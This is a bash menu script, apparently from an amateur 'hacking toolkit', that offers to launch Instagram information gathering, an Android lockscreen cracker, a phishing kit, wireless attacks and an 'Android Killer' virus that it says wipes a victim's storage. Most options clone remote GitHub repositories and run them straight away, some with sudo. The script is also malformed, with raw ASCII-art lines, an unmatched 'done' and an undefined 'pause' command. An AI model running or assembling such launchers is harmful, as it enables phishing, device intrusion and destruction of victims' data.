  #!/bin/bash

# colour 
Black="\033[1;30m"       # Black
Red="\033[1;31m"         # Red
Green="\033[1;32m"       # Green
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White

_   _ _  ___   _
| \ | | |/ / \ | |
|  \| | ' /|  \| |
| |\  | . \| |\  |
|_| \_|_|\_\_| \_|
       Made by Dragonnkn
       
       
clear
apt-get update
apt-get upgrade
apt-get install python
apt-get install python2
clear
echo -e "$Green Created By \e[1;34m"
       NKN17 | lolcat
sleep 2.0

    echo " "
    echo -e "$Red                               ⫸ Coded by$Yellow N_K_N_17_ $Red ⫷\033[0m"
    echo -e "$Red                               ⫸$Yellow CYBER-D $Yellow ⫷\033[0m"
echo " "
echo -e " $Yellow       ||----------------------------$Cyan [features] $Blue ---------------------------||"
echo -e " $Yellow       ||                                                                    ||"
echo -e " $Yellow       ||             $Purple%=>$Yellow[1️⃣] Insta information gathering$Blue                     ||"
echo -e " $Yellow       ||             $Purple%=>️$Yellow[2️⃣] Crack android lockscreen interfaces$Blue             ||"
echo -e " $Yellow       ||             $Purple%=>$Yellow[3️⃣] Phishing $Blue                                  ||"
echo -e " $Yellow       ||             $Purple%=>$Yellow[4️⃣] Wireless Attacks$Blue                                ||"
echo -e " $Yellow       ||             $Purple%=>$Yellow[5️⃣] Android Killer$Blue                                    ||"
echo -e " $Yellow       ||             $Purple%=>$Yellow[6️⃣] Update $Blue                                    ||"
echo -e " $Yellow       ||             $Purple%=>$Yellow[7️⃣] Coming soon..$Blue                                           ||"
echo -e " $Yellow       ||             $Purple%=>$Yellow[8️⃣] exit$Blue                                            ||"
echo -e " $Yellow       ||                                                                    ||"                                                                                       
echo -e " $Yellow       ||---------------------------$Cyan [select option] $Blue -----------------------||"
echo -e " $Blue      |---------------------------------------------------------------------|"
echo " "
echo " "

    read ch
   if [ $ch -eq 1 ];then
        cd $HOME
        cd Xteam
        cd Ig_information_gathering
        bash start.sh

        exit
    elif [ $ch -eq 2 ];then 
         cd $HOME
         git clone https://github.com/tegal1337/CiLocks
         cd CiLocks
         chmod +x cilocks
         sudo ./cilocks
        
        exit
    elif [ $ch -eq 3 ];then
        git clone git://github.com/htr-tech/zphisher.git
        cd zphisher
        bash zphisher.sh

        exit
    elif [ $ch -eq 4 ];then
        git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git
        cd airgeddon
        sudo bash airgeddon.sh


        exit
    elif [ $ch -eq 5 ];then
        cd $HOME
        cd Xteam
        cd infect
        echo -e "\e[1;34m  This Virus Formates (Deletes) the victims Full Internal Storage So think and Use."
        bash infect.sh
        
     
        exit
   elif [ $ch -eq 6 ];then 
        echo -e "\e[1;34m Downloading Latest Files..."
        cd $HOME
        rm -rf Xteam
        git clone https://github.com/xploitstech/Xteam
        cd Xteam
        bash Xteam.sh   
        
        exit
   elif [ $ch -eq 7 ];then
        echo -e  "\e[1;34m Downloading Latest Files..."
        

       
        
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
    fi
done
